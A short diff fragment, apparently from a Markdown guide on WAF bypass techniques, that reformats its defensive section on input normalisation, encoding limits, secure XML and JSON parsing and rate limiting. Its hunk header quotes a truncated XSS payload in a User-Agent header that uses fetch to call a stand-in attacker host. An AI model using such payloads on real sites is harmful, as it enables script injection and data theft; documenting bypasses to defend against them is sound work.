@@ -583,12 +583,12 @@ User-Agent: <img src=x onerror="this.outerHTML='<svg onload=fetch(`http://attack
 
 # Remediation Prevention  
 
->Defense: How to Stop These WAF Bypass Techniques  
+>Defense: How to Stop WAF Bypass Techniques:  
 
 ✅ **Normalize Inputs**: Convert all inputs to **lowercase** before validation.  
 ✅ **Use Web Application Firewalls with Machine Learning**: Modern **AI-based WAFs** can detect obfuscated payloads.  
 ✅ **Limit Allowed Encoding**: Block requests using **UTF-16, Unicode encoding, and nested Base64**.  
 ✅ **Use Secure Parsers**:  
-   - For **XML**, disable **DTD processing**.  
-   - For **JSON**, use **strict schema validation**.  
+✅ For **XML**, disable **DTD processing**.  
+✅ For **JSON**, use **strict schema validation**.  
 ✅ **Rate-Limiting & Anomaly Detection**: Block excessive requests to **detect evasion attempts**.  
